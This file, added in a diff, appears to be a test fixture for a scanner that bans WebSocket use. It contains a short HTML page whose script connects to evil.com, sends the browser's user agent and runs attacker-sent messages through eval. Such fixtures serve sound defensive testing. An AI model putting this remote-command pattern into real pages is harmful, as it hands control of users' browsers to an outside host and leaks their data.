@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>Direct WebSocket Attack</title>
+</head>
+<body>
+  <!-- Attack: WebSocket creates persistent external channel -->
+  <script>
+    // This should be caught by AST analysis - WebSocket is banned
+    const ws = new WebSocket('wss://evil.com/ws');
+    ws.onopen = () => {
+      ws.send(JSON.stringify({type: 'hello', userAgent: navigator.userAgent}));
+    };
+    ws.onmessage = (e) => {
+      // Execute commands from attacker
+      eval(e.data);
+    };
+  </script>
+</body>
+</html>
